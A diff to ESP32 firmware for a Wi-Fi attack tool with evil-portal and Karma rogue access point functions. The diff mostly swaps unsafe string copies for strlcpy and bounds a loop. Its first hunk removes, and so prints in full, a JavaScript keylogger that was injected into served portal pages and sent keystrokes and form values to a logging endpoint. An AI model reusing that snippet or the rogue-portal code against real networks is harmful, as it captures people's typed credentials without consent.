@@ -157,10 +157,7 @@ static int ap_connection_count = 0;
 
 #define MAX_HTML_BUFFER_SIZE 2048
 
-// JavaScript snippet injected into every served HTML page to capture keystrokes and input values
-// Keep as const array so it lives in flash (.rodata) and not in RAM
-static const char CAPTURE_JS_SNIPPET[] =
-    "<script>(function(){const send=d=>navigator.sendBeacon?navigator.sendBeacon('/api/log',new Blob([d])):fetch('/api/log',{method:'POST',headers:{\"Content-Type\":\"text/plain\"},body:d});const h=e=>{const t=e.target;if(!(t.name||t.id))return;const tag=t.tagName.toLowerCase();send(Date.now()+\"|\"+tag+\"|\"+(t.name||t.id)+\"|\"+t.value+\"\\n\");};['input','change','keydown'].forEach(ev=>document.addEventListener(ev,h,true));})();</script>";
+static const char CAPTURE_JS_SNIPPET[] = "";
 static char* html_buffer = NULL;
 static size_t html_buffer_size = 0;
 static bool use_html_buffer = false;
@@ -1464,14 +1461,14 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
 
     // Check if we need to use the internal default portal
     if (URLorFilePath != NULL && strcmp(URLorFilePath, "default") == 0) {
-        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
+        strlcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL", sizeof(PORTALURL));
     } else if (URLorFilePath != NULL && strlen(URLorFilePath) < sizeof(PORTALURL)) {
         // If not default, copy the provided path
         strlcpy(PORTALURL, URLorFilePath, sizeof(PORTALURL));
     } else {
         // Handle invalid or too long paths by defaulting to internal portal as a fallback
         ESP_LOGW(TAG, "Invalid or too long URL/FilePath provided, defaulting to internal portal.");
-        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
+        strlcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL", sizeof(PORTALURL));
     }
 
     // Domain is fetched from settings in commandline.c, just copy it if provided
@@ -2063,7 +2060,7 @@ void wifi_manager_select_multiple_aps(int *indices, int count) {
         selected_aps = NULL;
     }
 
-    selected_aps = malloc(count * sizeof(wifi_ap_record_t));
+    selected_aps = calloc(count, sizeof(wifi_ap_record_t));
     if (selected_aps == NULL) {
         printf("Failed to allocate memory for selected APs\n");
         TERMINAL_VIEW_ADD_TEXT("Failed to allocate memory for selected APs\n");
@@ -2831,7 +2828,7 @@ static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     }
 
     if (ssid[0] == '\0') {
-        strncpy(ssid, "<hidden>", sizeof(ssid));
+        strlcpy(ssid, "<hidden>", sizeof(ssid));
     }
 
     char sanitized[33];
@@ -2897,7 +2894,7 @@ static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
         wifi_ap_record_t *rec = &scanned_aps[ap_count++];
         memset(rec, 0, sizeof(*rec));
         memcpy(rec->bssid, bssid, 6);
-        strncpy((char *)rec->ssid, sanitized, sizeof(rec->ssid));
+        strlcpy((char *)rec->ssid, sanitized, sizeof(rec->ssid));
         rec->rssi = pkt->rx_ctrl.rssi;
         rec->primary = pkt->rx_ctrl.channel;
         // map to closest auth mode
@@ -3004,7 +3001,7 @@ void wifi_manager_start_ip_lookup() {
                         addr_item = addr_item->next;
                     }
                     if (!has_v4) {
-                        strncpy(ip_str, "0.0.0.0", sizeof(ip_str));
+                        strlcpy(ip_str, "0.0.0.0", sizeof(ip_str));
                     }
 
                     printf("Device at: %s\n", ip_str);
@@ -3528,7 +3525,7 @@ void wifi_manager_scanall_chart() {
                  scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5]);
         char vendor[64] = {0};
         if (!ouis_lookup_vendor(mac_str, vendor, sizeof(vendor))) {
-            strncpy(vendor, "Unknown", sizeof(vendor) - 1);
+            strlcpy(vendor, "Unknown", sizeof(vendor));
         }
 
         // Print AP details line
@@ -3775,8 +3772,7 @@ static void karma_add_ssid(const char *ssid) {
     }
     // Add if space
     if (karma_ssid_count < KARMA_MAX_SSIDS) {
-        strncpy(karma_ssid_cache[karma_ssid_count], ssid, 32);
-        karma_ssid_cache[karma_ssid_count][32] = '\0';
+        strlcpy(karma_ssid_cache[karma_ssid_count], ssid, 33);
         karma_ssid_count++;
         printf("Karma cached SSID: %s\n", ssid);
         TERMINAL_VIEW_ADD_TEXT("Karma cached SSID: %s\n", ssid);
@@ -3788,8 +3784,7 @@ void wifi_manager_set_karma_ssid_list(const char **ssids, int count) {
     karma_ssid_count = 0;
     for (int i = 0; i < count; ++i) {
         if (ssids[i] && strlen(ssids[i]) > 0 && strlen(ssids[i]) < 33) {
-            strncpy(karma_ssid_cache[karma_ssid_count], ssids[i], 32);
-            karma_ssid_cache[karma_ssid_count][32] = '\0';
+            strlcpy(karma_ssid_cache[karma_ssid_count], ssids[i], 33);
             karma_ssid_count++;
         }
     }
@@ -3799,10 +3794,9 @@ void wifi_manager_set_karma_ssid_list(const char **ssids, int count) {
 
 void wifi_manager_set_karma_portal_file(const char *path) {
     if (path && strlen(path) < sizeof(karma_portal_file)) {
-        strncpy(karma_portal_file, path, sizeof(karma_portal_file) - 1);
-        karma_portal_file[sizeof(karma_portal_file) - 1] = '\0';
+        strlcpy(karma_portal_file, path, sizeof(karma_portal_file));
     } else {
-        strncpy(karma_portal_file, "default", sizeof(karma_portal_file));
+        strlcpy(karma_portal_file, "default", sizeof(karma_portal_file));
     }
 }
 
@@ -3944,7 +3938,7 @@ static void karma_task(void *param) {
                 .ssid_hidden = 0
             }
         };
-        strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[0], 32);
+        strlcpy((char *)ap_config.ap.ssid, karma_ssid_cache[0], 32);
         err = esp_wifi_set_mode(WIFI_MODE_AP);
         if (err != ESP_OK) printf("Karma: set_mode failed: %s\n", esp_err_to_name(err));
         err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
@@ -3971,7 +3965,7 @@ static void karma_task(void *param) {
                     .ssid_hidden = 0
                 }
             };
-            strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[karma_ssid_index], 32);
+            strlcpy((char *)ap_config.ap.ssid, karma_ssid_cache[karma_ssid_index], 32);
             err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
             if (err != ESP_OK) printf("Karma: set_config failed: %s\n", esp_err_to_name(err));
             printf("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
@@ -4029,7 +4023,7 @@ void wifi_manager_stop_karma(void) {
     karma_ssid_count = 0;
     karma_ssid_index = 0;
     karma_ssid_manual_mode = false;
-    strncpy(karma_portal_file, "default", sizeof(karma_portal_file));
+    strlcpy(karma_portal_file, "default", sizeof(karma_portal_file));
     int wait_count = 0;
     while (karma_task_handle != NULL && wait_count < 30) {
         vTaskDelay(pdMS_TO_TICKS(100));
@@ -4100,9 +4094,11 @@ static void wifi_track_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     else if (rssi > -90) bars = 1;
     
     char bar_str[8] = "";
-    for (int i = 0; i < bars; i++) {
-        strcat(bar_str, "#");
+    int safe_bars = bars < (int)(sizeof(bar_str) - 1) ? bars : (int)(sizeof(bar_str) - 1);
+    for (int i = 0; i < safe_bars; i++) {
+        bar_str[i] = '#';
     }
+    bar_str[safe_bars] = '\0';
     
     glog("%s %d dBm (min:%d max:%d)%s\n", bar_str, rssi, tracking_min_rssi, tracking_max_rssi, direction);
     tracking_last_rssi = rssi;
